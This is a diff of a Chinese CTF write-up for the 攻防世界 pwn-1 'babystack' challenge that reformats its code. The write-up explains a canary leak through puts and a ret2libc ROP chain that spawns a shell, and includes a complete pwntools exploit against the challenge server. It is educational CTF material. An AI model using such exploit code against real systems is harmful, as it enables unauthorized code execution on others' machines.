@@ -21,123 +21,131 @@ author: gbeefee
 
 例题：攻防世界pwn-1
 
-![checksec](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/checksec.png)
+![checksec](https://github.com/gbeefee/imghome/blob/main/checksec.png)
 
 没有pie保护
 
-![main](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/main.png)
+![main](https://github.com/gbeefee/imghome/blob/main/main.png)
 
-![menu](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/menu.png)
+![menu](https://github.com/gbeefee/imghome/blob/main/menu.png)
 
 不存在后门，有很明显的溢出点，但是有canary保护，需要先泄露canary。
 
 canary的最后一位是\x00，但是puts函数读取到\x00就会自动停止，第一次输入b'a'*0x80\n，最后一个字节正好把\x00覆盖，puts函数就会连带把canary一起打印，之后再把\x00补上，就成功泄露了canary。
 
-`io.sendlineafter(">>",'1')`
+```
+io.sendlineafter(">>",'1')
 
-`io.sendline(b'a'*0x88)`
+io.sendline(b'a'*0x88)
 
-`io.sendlineafter(">>",'2')`
+io.sendlineafter(">>",'2')
 
-`io.recvuntil('a\n')`
+io.recvuntil('a\n')
 
-`canary = u64(io.recv(7).rjust(8,b'\x00'))`
+canary = u64(io.recv(7).rjust(8,b'\x00'))
+```
 
 泄露puts的真实地址，这里需要使用ROPgadget获取pop_rdi。
 
-`payload1 = b'A'*0x88 + p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)`
+```
+payload1 = b'A'*0x88 + p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
 
-`io.sendlineafter(">> ",'1')`
+io.sendlineafter(">> ",'1')
 
-`io.sendline(payload1)`
+io.sendline(payload1)
 
-`io.sendlineafter(">> ",'3')`
+io.sendlineafter(">> ",'3')
 
-`puts_addr = u64(io.recv(6).ljust(8,b'\x00'))`
+puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
 
-`print(hex(puts_addr))`
+print(hex(puts_addr))
+```
 
 最后通过偏移计算出system和binsh的地址
 
-`libc = LibcSearcher('puts', puts_addr)`
+```
+libc = LibcSearcher('puts', puts_addr)
 
-`libc_base = puts_addr - libc.dump('puts')`
+libc_base = puts_addr - libc.dump('puts')
 
-`system = libc_base + libc.dump('system')`
+system = libc_base + libc.dump('system')
 
-`binsh = libc_base + libc.dump('str_bin_sh')`
+binsh = libc_base + libc.dump('str_bin_sh')
 
-`io.sendlineafter('>> ','1')`
+io.sendlineafter('>> ','1')
 
-`payload2 ='a'*0x88 + p64(canary) +p64(0)+ p64(pop_rdi) + p64(binsh) + p64(system)`
+payload2 ='a'*0x88 + p64(canary) +p64(0)+ p64(pop_rdi) + p64(binsh) + p64(system)
 
-`io.send(payload2)`
+io.send(payload2)
 
-`io.sendlineafter('>> ','3')`
+io.sendlineafter('>> ','3')
 
-`io.interactive()`
+io.interactive()
+```
 
 结果如图
 
-![result](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/result.png)
+![result](https://github.com/gbeefee/imghome/blob/main/result.png)
 
 完整exp：
 
-`from pwn import *`
+```
+from pwn import *
 
-`from LibcSearcher import *`
+from LibcSearcher import *
 
-`context(os="linux", arch="amd64", log_level="debug")`
+context(os="linux", arch="amd64", log_level="debug")
 
-`elf = ELF("./babystack")`
+elf = ELF("./babystack")
 
-`io=remote("61.147.171.105", 57778)`
+io=remote("61.147.171.105", 57778)
 
-`\#io=process("./babystack")`
+#io=process("./babystack")
 
-`main_addr=0x0400908`
+main_addr=0x0400908
 
-`pop_rdi = 0x0400a93`
+pop_rdi = 0x0400a93
 
-`puts_got = elf.got['puts']`
+puts_got = elf.got['puts']
 
-`puts_plt = elf.plt['puts']`
+puts_plt = elf.plt['puts']
 
-`io.sendlineafter(">>",'1')`
+io.sendlineafter(">>",'1')
 
-`io.sendline(b'a'*0x88)`
+io.sendline(b'a'*0x88)
 
-`io.sendlineafter(">>",'2')`
+io.sendlineafter(">>",'2')
 
-`io.recvuntil('a\n')`
+io.recvuntil('a\n')
 
-`canary = u64(io.recv(7).rjust(8,b'\x00'))`
+canary = u64(io.recv(7).rjust(8,b'\x00'))
 
-`payload2 = b'A'*0x88 + p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)`
+payload2 = b'A'*0x88 + p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
 
-`io.sendlineafter(">> ",'1')`
+io.sendlineafter(">> ",'1')
 
-`io.sendline(payload2)`
+io.sendline(payload2)
 
-`io.sendlineafter(">> ",'3')`
+io.sendlineafter(">> ",'3')
 
-`puts_addr = u64(io.recv(6).ljust(8,b'\x00'))`
+puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
 
-`libc = LibcSearcher('puts', puts_addr)`
+libc = LibcSearcher('puts', puts_addr)
 
-`libc_base = puts_addr - libc.dump('puts')`
+libc_base = puts_addr - libc.dump('puts')
 
-`system = libc_base + libc.dump('system')`
+system = libc_base + libc.dump('system')
 
-`binsh = libc_base + libc.dump('str_bin_sh')`
+binsh = libc_base + libc.dump('str_bin_sh')
 
-`io.sendlineafter('>> ','1')`
+io.sendlineafter('>> ','1')
 
-`payload2 ='a'*0x88 + p64(canary) +p64(0)+ p64(pop_rdi) + p64(binsh) + p64(system)`
+payload2 ='a'*0x88 + p64(canary) +p64(0)+ p64(pop_rdi) + p64(binsh) + p64(system)
 
-`io.send(payload2)`
+io.send(payload2)
 
-`io.sendlineafter('>> ','3')`
+io.sendlineafter('>> ','3')
 
-`io.interactive()`
+io.interactive()
+```
 
